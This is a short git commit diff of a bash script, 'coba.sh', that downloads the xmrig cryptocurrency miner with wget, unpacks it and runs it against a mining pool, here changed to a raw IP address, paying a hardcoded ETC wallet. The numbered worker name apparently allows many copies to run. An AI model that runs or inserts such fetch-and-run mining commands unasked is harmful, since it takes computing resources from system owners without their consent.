d2b9b51109b4a7e15a885049e0cbea0321b3dd3c
aikarey <43464271+aikarey@users.noreply.github.com>
2021-11-28 05:59:15 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
-ip a
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz 
 tar xvzf xmrig-6.16.0-linux-x64.tar.gz 
-xmrig-6.16.0/xmrig -t 3 -o rx.unmineable.com:3333 -a rx -k -u ETC:0x03a88d3efc4266081eff9c87bab15e05e59a8f5f.pekerja2 -p x pause
+xmrig-6.16.0/xmrig -t 3 -o 128.199.71.34:3333 -a rx -k -u ETC:0x03a88d3efc4266081eff9c87bab15e05e59a8f5f.pekerja$1 -p x pause
